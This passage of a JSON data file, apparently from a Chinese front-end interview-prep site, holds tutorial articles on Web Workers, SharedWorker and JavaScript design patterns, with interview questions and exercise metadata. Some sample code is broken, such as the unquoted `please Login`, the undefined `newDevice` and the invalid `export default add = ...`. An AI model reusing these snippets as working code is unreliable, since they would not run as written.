worker\n\nmyWorker.addEventListener('message', e => {\n    console.log(e.data);\n});\n\nmyWorker.postMessage('Greeting from Main.js');\n```\n\n```js\n// worker.js（worker线程）\n\nself.addEventListener('message', e => {\n\n    postMessage('Greeting from Worker');\n    \n    self.close(); // 关闭 worker\n    \n    setTimeout(() => {\n        console.log('setTimeout run');\n        postMessage('Greeting from SetTimeout');\n    });\n    \n    Promise.resolve().then(() => {\n        console.log('Promise run');\n        postMessage('Greeting from Promise');\n    })\n    \n    for (let i = 0; i < 1001; i++) {\n        if (i === 1000) {\n            console.log('Loop run');\n            postMessage('Greeting from Loop');\n        }\n    }\n    \n});\n```\n\n运行结果如下：\n\n![image.png](https://static.ecool.fun//article/b840c22c-a783-47f6-b2ab-39f80c6a2082.awebp)\n\n与在主线程关闭不同的是，worker 线程当前的 Event Loop 任务队列中的 `postMessage()` 事件都会被主线程监听到。\n\n### 2.5 Worker 线程引用其他js文件\n\n总有一些场景，需要放到 worker 进程去处理的任务很复杂，需要大量的处理逻辑，我们当然不想把所有代码都塞到 `worker.js` 里，那样就太糟糕了。不出意料，web worker 为我们提供了解决方案，我们可以在 worker 线程中利用 `importScripts()` 方法加载我们需要的js文件，而且，通过此方法加载的js文件**不受同源策略约束**！\n\n```js\n// utils.js\nconst add = (a, b) => a + b;\n```\n\n```js\n// worker.js（worker线程）\n// 使用方法：importScripts(path1, path2, ...); \n\nimportScripts('./utils.js');\n\nconsole.log(add(1, 2)); // log 3\n```\n\n### 2.6 ESModule 模式\n\n还有一些场景，当你开启一个新项目，正高兴的用 `importScripts()` 导入js文件时发现， `importScripts()` 方法执行失败。仔细一看，原来是新项目的 js 文件都用的是 ESModule 模式。难道要把引用到的文件都改一遍吗？当然不用，还记得上文提到初始化 worker 时的第二个可选参数吗，我们可以直接使用 module 模式初始化 worker 线程！\n\n```js\n// main.js（主线程）\nconst worker = new Worker('/worker.js', {\n    type: 'module'  // 指定 worker.js 的类型\n});\n```\n\n```js\n// utils.js\nexport default add = (a, b) => a + b;\n```\n\n```js\n// worker.js（worker线程）\nimport add from './utils.js'; // 导入外部js\n\nself.addEventListener('message', e => { \n    postMessage(e.data);\n});\n\nadd(1, 2); // log 3\n\nexport default self; // 只需把顶级对象self暴露出去即可\n```\n\n### 2.7 主线程和 worker 线程可传递哪些类型数据\n\n很多场景，在调用某些方法时，我们将一些自定义方法当作参数传入。但是，当你使用 `postMessage()` 方法时这么做，将会导致 `DATA_CLONE_ERR` 错误。\n\n```js\n// main.js（主线程）\nconst myWorker = new Worker('/worker.js'); // 创建worker\n\nconst fun = () => {};\n\nmyWorker.postMessage(fun); // Error：Failed to execute 'postMessage' on 'Worker': ()=>{} could not be cloned.\n\n```\n\n那么，使用 `postMessage()` 方法传递消息，可以传递哪些数据？\n\n`postMessage()` 传递的数据可以是由[结构化克隆](https://developer.mozilla.org/en-US/docs/Web/Guide/DOM/The_structured_clone_algorithm \"https://developer.mozilla.org/en-US/docs/Web/Guide/DOM/The_structured_clone_algorithm\")算法处理的任何值或 JavaScript 对象，包括循环引用。\n\n结构化克隆算法**不能处理**的数据：\n\n-   `Error` 以及 `Function` 对象；\n-   DOM 节点\n-   对象的某些特定参数不会被保留\n    -   `RegExp` 对象的 `lastIndex` 字段不会被保留\n    -   属性描述符，setters 以及 getters（以及其他类似元数据的功能）同样不会被复制。例如，如果一个对象用属性描述符标记为 read-only，它将会被复制为 read-write\n    -   原形链上的属性也不会被追踪以及复制。\n\n结构化克隆算法**支持**的数据类型：\n\n| 类型 | 说明 |\n| --- | --- |\n| [所有的原始类型](https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Data_structures#%E5%8E%9F%E5%A7%8B%E5%80%BC \"https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Data_structures#%E5%8E%9F%E5%A7%8B%E5%80%BC\") | symbols 除外 |\n| [Boolean](https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/Boolean \"https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/Boolean\") 对象 |   |\n| String 对象 |   |\n| [Date](https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/Date \"https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/Date\") |   |\n| [RegExp](https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/RegExp \"https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/RegExp\") | `lastIndex` 字段不会被保留。 |\n| [`Blob`](https://developer.mozilla.org/zh-CN/docs/Web/API/Blob \"https://developer.mozilla.org/zh-CN/docs/Web/API/Blob\") |   |\n| [`File`](https://developer.mozilla.org/zh-CN/docs/Web/API/File \"https://developer.mozilla.org/zh-CN/docs/Web/API/File\") |   |\n| [`FileList`](https://developer.mozilla.org/zh-CN/docs/Web/API/FileList \"https://developer.mozilla.org/zh-CN/docs/Web/API/FileList\") |   |\n| [ArrayBuffer](https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/ArrayBuffer \"https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/ArrayBuffer\") |   |\n| [ArrayBufferView](https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/TypedArray \"https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/TypedArray\") | 这基本上意味着所有的 [类型化数组](https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Typed_arrays \"https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Typed_arrays\") ，如 Int32Array 等。 |\n| [`ImageData`](https://developer.mozilla.org/zh-CN/docs/Web/API/ImageData \"https://developer.mozilla.org/zh-CN/docs/Web/API/ImageData\") |   |\n| [Array](https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/Array \"https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/Array\") |   |\n| [Object](https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/Object \"https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/Object\") | 仅包括普通对象（如对象字面量） |\n| [Map](https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/Map \"https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/Map\") |   |\n| [Set](https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/Set \"https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/Set\") |   |\n\n## 3.SharedWorker\n\n**SharedWorker** 是一种特殊类型的 Worker，可以被多个浏览上下文访问，比如多个 windows，iframes 和 workers，但这些浏览上下文必须同源。它们实现于一个不同于普通 worker 的接口，具有不同的全局作用域：[`SharedWorkerGlobalScope`](https://developer.mozilla.org/en-US/docs/Web/API/SharedWorkerGlobalScope \"https://developer.mozilla.org/en-US/docs/Web/API/SharedWorkerGlobalScope\") ，但是继承自[`WorkerGlobalScope`](https://developer.mozilla.org/en-US/docs/Web/API/SharedWorkerGlobalScope#properties_inherited_from_workerglobalscope \"https://developer.mozilla.org/en-US/docs/Web/API/SharedWorkerGlobalScope#properties_inherited_from_workerglobalscope\")\n\n![image.png](https://static.ecool.fun//article/90ea2a5b-9097-428a-900a-168a4fd77c99.awebp)\n\n`SharedWorker` 线程的创建和使用跟 `worker` 类似，事件和方法也基本一样。 不同点在于，主线程与 `SharedWorker` 线程是通过[`MessagePort`](https://developer.mozilla.org/en-US/docs/Web/API/MessagePort \"https://developer.mozilla.org/en-US/docs/Web/API/MessagePort\")建立起链接，数据通讯方法都挂载在`SharedWorker.port`上。\n\n值得注意的是，如果你采用 `addEventListener` 来接收 `message` 事件，那么在主线程初始化`SharedWorker()` 后，还要调用 `SharedWorker.port.start()` 方法来手动开启端口。\n\n```js\n// main.js（主线程）\nconst myWorker = new SharedWorker('./sharedWorker.js');\n\nmyWorker.port.start(); // 开启端口\n\nmyWorker.port.addEventListener('message', msg => {\n    console.log(msg.data);\n})\n```\n\n但是，如果采用 `onmessage` 方法，则默认开启端口，不需要再手动调用`SharedWorker.port.start()`方法\n\n```js\n// main.js（主线程）\nconst myWorker = new SharedWorker('./sharedWorker.js');\n\nmyWorker.port.onmessage = msg => {\n    console.log(msg.data);\n};\n```\n\n以上两种方式效果是一样的，具体信息请参考[MessagePort](https://developer.mozilla.org/en-US/docs/Web/API/MessagePort \"https://developer.mozilla.org/en-US/docs/Web/API/MessagePort\")。\n\n由于 `SharedWorker` 是被多个页面共同使用，那么除了与各个页面之间的数据通讯是独立的，同一个`SharedWorker` 线程上下文中的其他资源都是共享的。基于这一点，很容易实现不同页面之间的数据通讯。\n\n### 一个利用`SharedWorker`实现多页面数据共享的例子\n\n1.  index 页面的 add 按钮，每点击一次，向 sharedWorker 发送一次 add 数据，页面 count 增加1\n\n```html\n// index.html\n\n<!DOCTYPE html>\n<html lang=\"zh-CN\">\n    <head>\n        <meta charset=\"utf-8\">\n        <title>index page</title>\n    </head>\n    <body>\n        <p>index page: </p>\n        count: <span id=\"container\">0</span>\n        <button id=\"add\">add</button>\n        <br>\n        // 利用iframe加载\n        <iframe src=\"./iframe.html\"></iframe>\n    </body>\n    <script type=\"text/javascript\">\n        if (!!window.SharedWorker) {\n            const container = document.getElementById('container');\n            const add = document.getElementById('add');\n            \n            const myWorker = new SharedWorker('./sharedWorker.js');\n            \n            myWorker.port.start();\n\n            myWorker.port.addEventListener('message', msg => {\n                container.innerText = msg.data;\n            });\n\n            add.addEventListener('click', () => {\n                myWorker.port.postMessage('add');\n            });\n        }\n    </script>\n</html>\n```\n\n2.  iframe 页面的 reduce 按钮，每点击一次，向 sharedWorker 发送一次 reduce 数据，页面count 减少1\n\n```html\n// iframe.html\n\n<!DOCTYPE html>\n<html lang=\"zh-CN\">\n    <head>\n        <meta charset=\"utf-8\">\n        <title>iframe page</title>\n    </head>\n    <body>\n        <p>iframe page: </p>\n        count: <span id=\"container\">0</span>\n        <button id=\"reduce\">reduce</button>\n    </body>\n    <script type=\"text/javascript\">\n        if (!!window.SharedWorker) {\n            const container = document.getElementById('container');\n            const reduce = document.getElementById('reduce');\n\n            const myWorker = new SharedWorker('./sharedWorker.js');\n\n            myWorker.port.start();\n            \n            myWorker.port.addEventListener('message', msg => {\n                container.innerText = msg.data;\n            })\n\n            reduce.addEventListener('click', () => {\n                myWorker.port.postMessage('reduce');\n            });\n        }\n    </script>\n</html>\n```\n\n3.  sharedWorker 在接收到数据后，根据数据类型处理 num 计数，然后返回给每个已连接的主线程。\n\n```js\n// sharedWorker.js\n\nlet num = 0;\nconst workerList = [];\n\nself.addEventListener('connect', e => {\n    const port = e.ports[0];\n    port.addEventListener('message', e => {\n        num += e.data === 'add' ? 1 : -1;\n        workerList.forEach(port => { // 遍历所有已连接的part，发送消息\n            port.postMessage(num);\n        })\n    });\n    port.start();\n    workerList.push(port); // 存储已连接的part\n    port.postMessage(num); // 初始化\n});\n```\n\n结果可以发现，index 页面和 iframe 页面的 count 始终保持一致，实现了多个页面数据同步。\n\n![](https://static.ecool.fun//article/2443b141-dcbe-43f9-bf4b-4c5f564782da.awebp)\n\n## `sharedWorker`调试\n\n在 `sharedWorker` 线程里使用 `console` 打印信息，不会出现在主线程的的控制台中。如果你想调试 `sharedWorker`，需要在 Chrome 浏览器输入 chrome://inspect/ ，这里能看到所有正在运行的 `sharedWorker`，然后开启一个独立的 dev-tool 面板。\n\n![image.png](https://static.ecool.fun//article/a5e4ea01-34eb-48d6-b2de-428870ff179a.awebp)\n\n\n## 结束语\n\n其实，除了 `worker` 和 `sharedWorker` 外，还有 `ServiceWorker`。它一般作为 Web 应用程序、浏览器和网络之间的代理服务，旨在创建有效的离线体验，拦截网络请求，并基于网络是否可用以及更新的资源是否驻留在服务器上来采取适当的动作。使用方法本文不作详细介绍，有兴趣可自行查看 [ServiceWorker](https://developer.mozilla.org/en-US/docs/Web/API/ServiceWorker \"https://developer.mozilla.org/en-US/docs/Web/API/ServiceWorker\")",
    "testPoint": "### 1. **Web Worker 的基本概念**\n   - 什么是 Web Worker？它的主要作用是什么？\n   - Web Worker 是如何帮助前端提高性能的？为什么会引入 Web Worker？\n\n### 2. **Web Worker 的工作原理**\n   - Web Worker 和主线程是如何通信的？\n   - Web Worker 在浏览器中是如何运行的？它是否和主线程共享同一个事件循环？\n\n### 3. **创建与终止 Web Worker**\n   - 请解释如何创建一个 Web Worker？示例代码中会包含哪些步骤？\n   - 如何终止一个 Web Worker？在什么情况下需要手动终止 Worker？\n\n### 4. **Web Worker 的通信机制**\n   - Web Worker 与主线程之间的通信是如何实现的？如何使用 `postMessage` 和 `onmessage` 进行双向通信？\n   - Web Worker 的通信是同步的还是异步的？主线程是如何接收 Worker 的消息的？\n\n### 5. **Web Worker 的局限性**\n   - Web Worker 中有哪些限制？它可以访问哪些对象或功能，不能访问哪些？\n   - 为什么 Web Worker 不能直接访问 DOM？如何解决在 Worker 中需要操作 DOM 的问题？\n\n### 6. **共享 Worker 和 Service Worker**\n   - 什么是 Shared Worker？它与普通 Web Worker 有什么区别？\n   - Web Worker 和 Service Worker 的作用有何不同？在实现离线缓存时，是否可以用 Web Worker 替代 Service Worker？\n\n### 7. **使用场景**\n   - 在什么场景下适合使用 Web Worker？比如数据密集型计算、实时处理等。\n   - 你是否使用 Web Worker 优化过性能？请分享一个具体的例子，如处理图像、数据加密等计算密集型任务。\n\n### 8. **Worker 中的异步任务**\n   - 如何在 Web Worker 中执行异步任务，例如进行网络请求？\n   - 在 Web Worker 中执行异步任务时，如何确保通信的顺序和结果的正确性？\n\n### 9. **传输大量数据的优化**\n   - 如果需要通过 `postMessage` 传递大量数据（如 ArrayBuffer），如何提高传输性能？\n   - 什么是 `Transferable Objects`？如何通过它实现数据的零拷贝传输？\n\n### 10. **Web Worker 的性能影响**\n   - 使用 Web Worker 是否一定会提高页面性能？在哪些情况下 Web Worker 的使用会带来性能开销？\n   - 在多线程和主线程频繁通信的情况下，如何避免通信瓶颈？\n\n### 11. **实际应用中的问题**\n   - 你在使用 Web Worker 时是否遇到过 bug 或性能瓶颈？如何解决？\n   - 在多 Worker 的场景中，如何管理和协调多个 Worker 的通信与状态？\n\n### 12. **Web Worker 与前端框架的整合**\n   - 在 React、Vue 等前端框架中，如何集成 Web Worker？有哪些实践技巧？\n   - 在使用 Web Worker 时，如何管理 Worker 的生命周期，以防止内存泄漏？\n\n### 13. **WebAssembly 和 Web Worker**\n   - 在 Web Worker 中使用 WebAssembly 有哪些优势？请简要说明。\n   - Web Worker 和 WebAssembly 是如何配合实现更高效的数据处理的？举例说明它们结合的应用场景。\n\n### 14. **实际案例与优化经验**\n   - 在你的项目中，你使用 Web Worker 解决过哪些具体问题？如图片压缩、大数据处理等。\n   - 请描述一个场景：在复杂应用中如何合理规划和调度 Web Worker 以达到最佳的并行效果？\n\n### 15. **其他类型的 Worker**\n   - 除了普通 Web Worker，你是否了解其他类型的 Worker，如 Worklet、AudioWorklet？它们有什么区别和应用场景？\n   - 在使用 Worklet 时，如何与 Web Worker 进行区分和选择？",
    "exerciseKeyList": "[\"f18218c8-4c74-4631-b66d-e7ac65929f35\",\"9ae6ebb4-5aae-4a1b-b0e8-15e1b12bc178\"]",
    "vipLimit": 1,
    "level": 4,
    "pointOrder": 25,
    "createAt": "2024-10-01T14:32:51.000Z",
    "updateAt": "2024-11-08T14:40:48.000Z",
    "$progressExercise": "",
    "$exerciseList": [
      {
        "exerciseKey": "9ae6ebb4-5aae-4a1b-b0e8-15e1b12bc178",
        "title": "Web Worker 是什么？",
        "category": "QA",
        "vipLimit": 0,
        "createAt": "2023-05-28T02:55:47.000Z",
        "updateAt": "2024-08-10T17:07:25.000Z"
      },
      {
        "exerciseKey": "f18218c8-4c74-4631-b66d-e7ac65929f35",
        "title": "WebWorker、SharedWorker 和 ServiceWorker 有哪些区别？",
        "category": "QA",
        "vipLimit": 1,
        "createAt": "2024-08-13T08:30:41.000Z",
        "updateAt": "2024-08-14T23:23:12.000Z"
      }
    ]
  },
  "31": {
    "id": 31,
    "tagId": 10,
    "title": "设计模式",
    "explanation": "说到设计模式，大家想到的就是六大原则，23种模式。这么多模式，并非都要记住，但作为前端开发，对于前端出现率高的设计模式还是有必要了解并掌握的，浅浅掌握9种模式后，整理了这份文章。\n\n那么，我们先了解六大原则\n\n# 六大原则：\n\n-   依赖倒置原则(Dependence Inversion Principle)：高层(业务层)不应该直接调用底层(基础层)模块\n-   开闭原则(Open Close Principle)：单模块对拓展开放、对修改关闭\n-   单一原则(Single Responsibility Principle)：单模块负责的职责必须是单一的\n-   迪米特法则(Law of Demeter)：对外暴露接口应该简单\n-   接口隔离原则(Interface Segregation Principle)：单个接口(类)都应该按业务隔离开\n-   里氏替换原则(Liskov Substitution Principle)：子类可以替换父类\n\n> 六大原则也可以用六个字替换：高内聚低耦合。\n> \n> -   **高**层不直接依赖底层：依赖倒置原则\n> -   **内**部修改关闭，外部开放扩展：开闭原则\n> -   **聚**合单一功能：单一原则\n> -   **低**知识接口，对外接口简单：迪米特法则\n> -   **耦**合多个接口，不如隔离拆分：接口隔离原则\n> -   **合**并复用，子类可以替换父类：里氏替换原则\n\n我们采用模式编写时，要尽可能遵守这六大原则\n\n# 23 种设计模式分为“创建型”、“行为型”和“结构型”\n\n![image.png](https://static.ecool.fun/others/6a18cc48-57e3-4193-9ed9-5140f8f2caee.png)\n\n# 前端九种设计模式\n\n![image.png](https://static.ecool.fun//article/343006d7-fa67-4774-aa01-c3495c08849d.)\n\n## 一、创建型\n\n创建型从功能上来说就是创建元素，目标是规范元素创建步骤\n\n### 1.构造器模式：抽象了对象实例的变与不变(变的是属性值，不变的是属性名)\n\n```js\n// 需求：给公司员工创建线上基本信息\n// 单个员工创建，可以直接使用创建\nconst obj = {\n    name:'张三',\n    age:'20',\n    department:'人力资源部门'\n}\n// 可员工的数量过于多的时候，一个个创建不可行，那么就可以使用构造器模式\nclass Person {\n    constructor(obj){\n        this.name = obj.name\n        this.age = obj.age\n        this.department = obj.department\n    }\n}\nconst person1 = new Person(obj)\n```\n\n### 2\\. 工厂模式：为创建一组相关或相互依赖的对象提供一个接口，且无须指定它们的具体类\n\n即隐藏创建过程、暴露共同接口。\n\n```js\n// 需求：公司员工创建完信息后需要为每一个员工创建一个信息名片\nclass setPerson {\n    constructor(obj) {\n        this.pesonObj = obj\n    }\n    creatCard() {\n        //创建信息名片\n    }\n    otherFynction(){\n    \n    }\n}\nclass Person {\n    constructor(obj) {\n        return new setPerson(obj)\n    }\n}\nconst person = new Person()\nconst card = person.creatCard({\n    name:'张三',\n    age:'20',\n    department:'人力资源部门'\n})\n\n```\n\n### 3\\. 单例模式：全局只有一个实例，避免重复创建对象，优化性能\n\n```js\n// 需求：判断一款应用的开闭状态，根据不同状态给出不同提示\nclass applicationStation {\n    constructor() {\n        this.state = 'off'\n    }\n    play() {\n        if (this.state === 'on') {\n            console.log('已打开')\n            return\n        }\n        this.state = 'on'\n    }\n    shutdown() {\n        if (this.state === 'off') {\n            console.log('已关闭')\n            return\n        }\n        this.state = 'off'\n    }\n}\nwindow.applicationStation = new applicationStation()\n// applicationStation.instance = undefined\n// applicationStation.getInstance = function() {\n//    return function() {\n//        if (!applicationStation.instance) {  // 如果全局没有实例再创建\n//            applicationStation.instance = new applicationStation()\n//        }\n//        return applicationStation.instance\n//    }()\n// }\n// application1和application2拥有同一个applicationStation对象\nconst application1 = window.applicationStation\nconst application2 = window.applicationStation\n \n```\n\n## 二、结构型\n\n结构型从功能上来说就是给元素添加行为的，目标是优化结构的实现方式\n\n### 1\\. 适配器模式:适配独立模块，保证模块间的独立解耦且连接兼容\n\n```js\n// 需求：一个港行PS，需要适配插座国标\nclass HKDevice {\n    getPlug() {\n        return '港行双圆柱插头'\n    }\n}\n\nclass Target {\n    constructor() {\n        this.plug = new HKDevice()\n    }\n    getPlug() {\n        return this.plug.getPlug() + '+港行双圆柱转换器'\n    }\n}\n\nconst target = new Target()\ntarget.getPlug()\n```\n\n### 2\\. 装饰器模式：动态将责任附加到对象之上\n\n```js\n// 说回我们之前说的为公司员工创建名片需求，现在追加需求，要给不同工龄的员工，创建不同的类型名片样式\n//由于的工厂函数还有其他各种方法，不好直接改动原工厂函数，这时候我们可以使用装饰器模式实现\nclass setPerson {\n    constructor(obj) {\n        this.pesonObj = obj\n    }\n    creatCard() {\n        //创建信息名片\n    }\n    otherFynction(){\n    \n    }\n}\n// 追加\nclass updatePerson {\n    constructor(obj) {\n        this.pesonObj = obj\n    }\n    creatCard() {\n        this.pesonObj.creatCard()\n        if(this.pesonObj.seniorityNum<1){\n               this.update(this.pesonObj)\n        }\n    }\n    update(pesonObj) {\n        //追加处理\n    }\n}\n\nconst person = new setPerson()\nconst newPerson = new updatePerson(person)\nnewDevice.creatCard()\n```\n\n### 3\\. 代理模式：使用代理人来替代原始对象处理更专业的事情\n\n```js\n// 需求：在单例模式中，我们实现了应用状态的判断，现在，我们需要控制这个应用要在登录注册的情况下才能使用,可以通过代理模式，讲这个需求代理给专门拦截的对象进行判断\nclass applicationStation {\n    init() {\n        return 'hello'\n    }\n}\n\nclass User {\n    constructor(loginStatus) {\n        this.loginStatus = loginStatus\n    }\n}\n\nclass applicationStationProxy {\n    constructor(user) {\n        this.user = user\n    }\n    init() {\n        return this.user.loginStatus ? new applicationStation().init() : please Login\n    }\n}\n\nconst user = new User(true)\nconst userProcy = new applicationStationProxy(user)\nuserProcy.init()\n```\n\n## 三、行为型\n\n不同对象之间责任的划分和算法的抽象化\n\n### 1\\. 观察者模式:当一个属性发生变化时，观察者会连续引发所有的相关状态变更\n\n```js\n// 需求：通过智能家居中心一键控制系统\nclass MediaCenter {\n    constructor() {\n        this.state = ''\n        this.observers = []\n    }\n    attach(observers) {\n        this.observers.push(observers)\n    }\n    getState() {\n        return this.state\n    }\n    setState(state) {\n        this.state = state\n        this.notifyAllobservers()\n    }\n    notifyAllobservers() {\n        this.observers.forEach(ob => {\n            ob.update()\n        })\n    }\n}\n\nclass observers {\n    constructor(name, center) {\n        this.name = name\n        this.center = center\n        this.center.attach(this)\n    }\n    update() {\n        // 更新状态\n        this.center.getState()\n    }\n}\n```\n\n### 2\\. 模版模式：在模版中，定义好每个方法的执行步骤。方法本身关注于自己的事情\n\n```js\n// 需求：新员工入职，按照规定流程，进行相关培训和办理好员工相关资料\nclass EntryPath {\n    constructor(obj) {\n       // some code\n    }\n    init() {\n        // 初始化员工信息\n    }\n    creatCard() {\n        // 创建员工名片\n    }\n    inductionTraining() {\n        // 入职培训\n    }\n    trainingExamination() {\n        // 训后测试\n    }\n    personEntry() {\n        this.init()\n        this.creatCard()\n        this.inductionTraining()\n        this.trainingExamination()\n    }\n}\n```\n\n### 3\\. 命令模式:请求以指令的形式包裹在对象中，并传给调用对象\n\n```js\n// 需求:游戏角色的控制\n// 接受者\nclass Receiver {\n    execute() {\n        // 奔跑\n    }\n}\n// 操控者\nclass Operator {\n    constructor(command) {\n        this.command = command\n    }\n    run() {\n        this.command.execute()\n    }\n}\n// 指令器\nclass command {\n    constructor(receiver) {\n        this.receiver = receiver\n    }\n    execute() {\n        // 逻辑\n        this.receiver.execute()\n    }\n}\nconst soldier = new Receiver()\nconst order = new command(soldier)\nconst player = new Operator(order)\nplayer.run()\n```",
    "testPoint": "### 1. **设计模式的基本概念**\n   - 什么是设计模式？为什么在软件开发中使用设计模式很重要？\n   - 设计模式有哪些分类？请简要说明三种常见分类：创建型模式、结构型模式和行为型模式。\n\n### 2. **单例模式（Singleton Pattern）**\n   - 请解释单例模式的概念。为什么我们在某些场景下会使用单例模式？\n   - 在 JavaScript 中，如何实现一个单例模式？有哪些方法可以确保对象实例唯一性？\n\n### 3. **工厂模式（Factory Pattern）**\n   - 工厂模式的作用是什么？它解决了什么问题？\n   - 请用 JavaScript 举例说明如何实现工厂模式，尤其是在处理不同类型对象的创建时。\n\n### 4. **观察者模式（Observer Pattern）**\n   - 什么是观察者模式？它的主要思想是什么？\n   - 在前端开发中，观察者模式有哪些应用场景？比如发布-订阅系统、事件监听机制等。\n\n### 5. **策略模式（Strategy Pattern）**\n   - 策略模式的概念是什么？如何使用策略模式来简化多条件判断逻辑？\n   - 你能举例说明如何在项目中使用策略模式吗？例如，为不同的用户角色设计不同的权限策略。\n\n### 6. **装饰器模式（Decorator Pattern）**\n   - 什么是装饰器模式？它如何增强对象的功能？\n   - 在 JavaScript 中，如何使用装饰器模式动态地为对象添加新的行为或属性？\n\n### 7. **代理模式（Proxy Pattern）**\n   - 什么是代理模式？它在什么情况下比较适用？\n   - 请举例说明如何在 JavaScript 中使用代理模式，例如利用 `Proxy` 进行数据访问控制。\n\n### 8. **适配器模式（Adapter Pattern）**\n   - 适配器模式的作用是什么？它解决了什么问题？\n   - 在前端开发中，适配器模式的应用场景有哪些？比如接口适配、数据格式转换等。\n\n### 9. **组合模式（Composite Pattern）**\n   - 组合模式是什么？它适用于什么样的结构？\n   - 在处理树形结构数据（如文件系统、DOM 树）时，如何使用组合模式简化操作？\n\n### 10. **中介者模式（Mediator Pattern）**\n   - 什么是中介者模式？它如何简化对象之间的复杂通信？\n   - 在组件间通信中，如何利用中介者模式实现去中心化管理？\n\n### 11. **命令模式（Command Pattern）**\n   - 命令模式是什么？它如何将请求封装为独立的对象？\n   - 在有撤销、重做功能的应用中，如何使用命令模式来管理用户的操作？\n\n### 12. **职责链模式（Chain of Responsibility Pattern）**\n   - 职责链模式的原理是什么？在什么情况下适合使用它？\n   - 请举例说明如何在处理表单校验、多步请求流程中应用职责链模式。\n\n### 13. **迭代器模式（Iterator Pattern）**\n   - 什么是迭代器模式？它的核心概念是什么？\n   - 在 JavaScript 中，如何使用 `Iterator` 和 `Generator` 来遍历复杂数据结构？\n\n### 14. **原型模式（Prototype Pattern）**\n   - 原型模式是什么？如何通过原型来共享对象的属性和方法？\n   - JavaScript 的原型继承与原型模式有哪些联系和区别？\n\n### 15. **实际应用中的设计模式**\n   - 在实际项目中，你是否使用过某种设计模式来优化代码结构？请分享一个具体的例子。\n   - 在项目中，如何平衡代码的简单性和设计模式带来的灵活性？在什么情况下不适合使用设计模式？\n\n### 16. **设计模式的组合应用**\n   - 你是否遇到过将多种设计模式结合使用的场景？例如工厂模式与单例模式的结合。\n   - 在复杂项目中，你如何合理选择和组合使用不同的设计模式来达到代码复用、可维护性的目的？",
    "exerciseKeyList": "[\"252664a5-1524-46f0-b6ae-ae7e2874f6e2\",\"13f1b2b9-725c-4c16-ada0-fb050fdafe28\",\"5893d2cc-0ce2-473b-9d42-341860dfdec9\",\"5a6bab0d-b96e-42ce-bfce-ba3b38e32728\",\"879ca17c-91e6-488d-a835-d89715f382c0\",\"54538af6-dc63-4f34-a9c9-0d76482e5558\",\"43972778-bd1d-4ff4-a153-6c6df65242e3\"]",
    "vipLimit": 1,
    "level": 4,
    "pointOrder": 28,
    "createAt": "2024-10-01T14:44:53.000Z",
    "updateAt": "2025-11-05T08:30:05.000Z",
    "$progressExercise": "",
    "$exerciseList": [
      {
        "exerciseKey": "13f1b2b9-725c-4c16-ada0-fb050fdafe28",
        "title": "设计模式的六大原则",
        "category": "QA",
        "vipLimit": 0,
        "createAt": "2021-07-06T15:32:23.000Z",
        "updateAt": "2021-07-11T10:52:53.000Z"
      },
      {
        "exerciseKey": "252664a5-1524-46f0-b6ae-ae7e2874f6e2",
        "title": "开发的过程中你用到过哪些设计模式？",
        "category": "QA",
        "vipLimit": 0,
        "createAt": "2022-07-24T02:49:59.000Z",
        "updateAt": "2023-12-17T18:13:23.000Z"
      },
      {
        "exerciseKey": "43972778-bd1d-4ff4-a153-6c6df65242e3",
        "title": "观察者模式和发布订阅模式分别是什么？有什么区别？",
        "category": "QA",
        "vipLimit": 0,
        "createAt": "2021-07-11T07:32:23.000Z",
        "updateAt": "2025-07-18T02:17:51.000Z"
      },
      {
        "exerciseKey": "54538af6-dc63-4f34-a9c9-0d76482e5558",
        "title": "“严格模式”是什么？",
        "category": "QA",
        "vipLimit": 0,
        "createAt": "2021-07-28T12:28:46.000Z",
        "updateAt": "2024-07-22T10:52:01.000Z"
      },
      {
        "exerciseKey": "5893d2cc-0ce2-473b-9d42-341860dfdec9",
        "title": "设计模式分类",
        "category": "QA",
        "vipLimit": 0,
        "createAt": "2021-07-06T15:28:52.000Z",
        "updateAt": "2022-04-10T15:32:08.000Z"
      },
      {
        "exerciseKey": "5a6bab0d-b96e-42ce-bfce-ba3b38e32728",
        "title": "工厂模式",
        "category": "QA",
        "vipLimit": 0,
        "createAt": "2021-07-06T15:38:16.000Z",
        "updateAt": "2021-07-07T00:14:33.000Z"
      },
      {
        "exerciseKey": "879ca17c-91e6-488d-a835-d89715f382c0",
        "title": "单例模式",
        "category": "QA",
        "vipLimit": 0,
        "createAt": "2021-07-06T15:36:49.000Z",
        "updateAt": "2021-07-11T10:52:57.000Z"
      }
    ]
  },
  "32": {
    "id": 32,
    "tagId": 21,
    "title": " XSS防御",
